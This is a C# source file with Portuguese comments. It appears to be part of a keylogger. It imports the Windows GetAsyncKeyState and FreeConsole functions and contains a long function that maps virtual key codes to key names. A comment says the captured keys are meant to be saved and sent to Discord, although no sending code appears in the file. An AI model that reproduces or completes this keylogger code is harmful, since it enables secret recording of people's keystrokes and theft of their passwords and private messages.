using System.Runtime.InteropServices;

namespace CastApp
{
    public class Natives
    {
        /// <summary>
        /// <param name="i"></param>
        /// <returns></returns>
        /// Importacao da Api do Windows user32.dll importamos uma funcao chamada GetAsyncKeyState() basicamente ela retorna o valor Decimal de uma Tecla 
        /// tem o site da microsoft que nos da os codigos hex das teclas apenas temos que converter o Hex para decimal 
        ///
        /// Site Microsoft: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        /// Site para converter: https://www.rapidtables.com/convert/number/hex-to-decimal.html
        /// <summary>
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FreeConsole();


        #region TeclaPrecionada Nao sera mais usado por agr mas fica aqui para o futuro
        /// <summary>
        /// Criei esta funcao para ser usada no futuro quando pegarmos a tecla precionada verificamos a que tecla corresponde e depois 
        /// apenas temos que guardar em um arquivo ou variavel para mandar logo para o Discord fica a vosso criterio
        /// </summary>
        public static string TeclaPrecionada(int intcode)
        {
            string teclaPrecionada = string.Empty;

            if (intcode == 1) teclaPrecionada = "[Btn Esquerdo do Rato]";
            else if (intcode == 2) teclaPrecionada = "[Btn Direito do Rato]";
            else if (intcode == 4) teclaPrecionada = "[Scroll do Rato]";
            else if (intcode == 145) teclaPrecionada = "[Scroll Lock]";
            else if (intcode == 144) teclaPrecionada = "[Num Lock]";
            else if (intcode == 8) teclaPrecionada = "[Backspace]";
            else if (intcode == 9) teclaPrecionada = "[Tab]";
            else if (intcode == 13) teclaPrecionada = "[Enter]";
            else if (intcode == 16) teclaPrecionada = "[Shift]";
            else if (intcode == 160) teclaPrecionada = "[Shift Esquerdo]";
            else if (intcode == 161) teclaPrecionada = "[Shift Direito]";
            else if (intcode == 17) teclaPrecionada = "[Ctrl]";
            else if (intcode == 162) teclaPrecionada = "[Ctrl Esquerdo]";
            else if (intcode == 163) teclaPrecionada = "[Ctrl Direito]";
            else if (intcode == 18) teclaPrecionada = "[Alt]";
            else if (intcode == 164) teclaPrecionada = "[Alt Esquerdo]";
            else if (intcode == 165) teclaPrecionada = "[Alt Direito]";
            else if (intcode == 19) teclaPrecionada = "[Pause]";
            else if (intcode == 20) teclaPrecionada = "[Caps Lock]";
            else if (intcode == 27) teclaPrecionada = "[Esc]";
            else if (intcode == 32) teclaPrecionada = "[Spacebar]";
            else if (intcode == 33) teclaPrecionada = "[PageUp]";
            else if (intcode == 34) teclaPrecionada = "[PageDown]";
            else if (intcode == 35) teclaPrecionada = "[End]";
            else if (intcode == 36) teclaPrecionada = "[Home]";
            else if (intcode == 37) teclaPrecionada = "[Seta para Esquerda]";
            else if (intcode == 38) teclaPrecionada = "[Seta para Cima]";
            else if (intcode == 39) teclaPrecionada = "[Seta para Direita]";
            else if (intcode == 40) teclaPrecionada = "[Seta para Baixo]";
            else if (intcode == 41) teclaPrecionada = "[Select]";
            else if (intcode == 44) teclaPrecionada = "[Print Sreen]";
            else if (intcode == 45) teclaPrecionada = "[Insert]";
            else if (intcode == 46) teclaPrecionada = "[Delete]";
            else if (intcode == 48) teclaPrecionada = "0";
            else if (intcode == 49) teclaPrecionada = "1";
            else if (intcode == 50) teclaPrecionada = "2";
            else if (intcode == 51) teclaPrecionada = "3";
            else if (intcode == 52) teclaPrecionada = "4";
            else if (intcode == 53) teclaPrecionada = "5";
            else if (intcode == 54) teclaPrecionada = "6";
            else if (intcode == 55) teclaPrecionada = "7";
            else if (intcode == 56) teclaPrecionada = "8";
            else if (intcode == 57) teclaPrecionada = "9";
            else if (intcode == 65) teclaPrecionada = "a";
            else if (intcode == 66) teclaPrecionada = "b";
            else if (intcode == 67) teclaPrecionada = "c";
            else if (intcode == 68) teclaPrecionada = "d";
            else if (intcode == 69) teclaPrecionada = "e";
            else if (intcode == 70) teclaPrecionada = "f";
            else if (intcode == 71) teclaPrecionada = "g";
            else if (intcode == 72) teclaPrecionada = "h";
            else if (intcode == 73) teclaPrecionada = "i";
            else if (intcode == 74) teclaPrecionada = "j";
            else if (intcode == 75) teclaPrecionada = "k";
            else if (intcode == 76) teclaPrecionada = "l";
            else if (intcode == 77) teclaPrecionada = "m";
            else if (intcode == 78) teclaPrecionada = "n";
            else if (intcode == 79) teclaPrecionada = "o";
            else if (intcode == 80) teclaPrecionada = "p";
            else if (intcode == 81) teclaPrecionada = "q";
            else if (intcode == 82) teclaPrecionada = "r";
            else if (intcode == 83) teclaPrecionada = "s";
            else if (intcode == 84) teclaPrecionada = "t";
            else if (intcode == 85) teclaPrecionada = "u";
            else if (intcode == 86) teclaPrecionada = "v";
            else if (intcode == 87) teclaPrecionada = "w";
            else if (intcode == 88) teclaPrecionada = "x";
            else if (intcode == 89) teclaPrecionada = "y";
            else if (intcode == 90) teclaPrecionada = "z";
            else if (intcode == 91) teclaPrecionada = "[Win Esquerdo]";
            else if (intcode == 92) teclaPrecionada = "[Win Direito]";
            else if (intcode == 95) teclaPrecionada = "[Sleep]";
            else if (intcode == 96) teclaPrecionada = "[Numpad 0]";
            else if (intcode == 97) teclaPrecionada = "[Numpad 1]";
            else if (intcode == 98) teclaPrecionada = "[Numpad 2]";
            else if (intcode == 99) teclaPrecionada = "[Numpad 3]";
            else if (intcode == 100) teclaPrecionada = "[Numpad 4]";
            else if (intcode == 101) teclaPrecionada = "[Numpad 5]";
            else if (intcode == 102) teclaPrecionada = "[Numpad 6]";
            else if (intcode == 103) teclaPrecionada = "[Numpad 7]";
            else if (intcode == 104) teclaPrecionada = "[Numpad 8]";
            else if (intcode == 105) teclaPrecionada = "[Numpad 9]";
            else if (intcode == 106) teclaPrecionada = "*";
            else if (intcode == 107) teclaPrecionada = "+";
            else if (intcode == 109) teclaPrecionada = "-";
            else if (intcode == 110) teclaPrecionada = ",";
            else if (intcode == 111) teclaPrecionada = "/";
            else if (intcode == 112) teclaPrecionada = "[F1]";
            else if (intcode == 113) teclaPrecionada = "[F2]";
            else if (intcode == 114) teclaPrecionada = "[F3]";
            else if (intcode == 115) teclaPrecionada = "[F4]";
            else if (intcode == 116) teclaPrecionada = "[F5]";
            else if (intcode == 117) teclaPrecionada = "[F6]";
            else if (intcode == 118) teclaPrecionada = "[F7]";
            else if (intcode == 119) teclaPrecionada = "[F8]";
            else if (intcode == 120) teclaPrecionada = "[F9]";
            else if (intcode == 121) teclaPrecionada = "[F10]";
            else if (intcode == 122) teclaPrecionada = "[F11]";
            else if (intcode == 123) teclaPrecionada = "[F12]";
            else if (intcode == 187) teclaPrecionada = "=";
            else if (intcode == 186) teclaPrecionada = "ç";
            else if (intcode == 188) teclaPrecionada = ",";
            else if (intcode == 189) teclaPrecionada = "-";
            else if (intcode == 190) teclaPrecionada = ".";
            else if (intcode == 192) teclaPrecionada = "'";
            else if (intcode == 191) teclaPrecionada = ";";
            else if (intcode == 193) teclaPrecionada = "/";
            else if (intcode == 194) teclaPrecionada = ".";
            else if (intcode == 219) teclaPrecionada = "´";
            else if (intcode == 220) teclaPrecionada = "]";
            else if (intcode == 221) teclaPrecionada = "[";
            else if (intcode == 222) teclaPrecionada = "~";
            else if (intcode == 226) teclaPrecionada = "\\";
            else teclaPrecionada = "[" + intcode + "]";

            return teclaPrecionada;
        }
        #endregion
    }
}
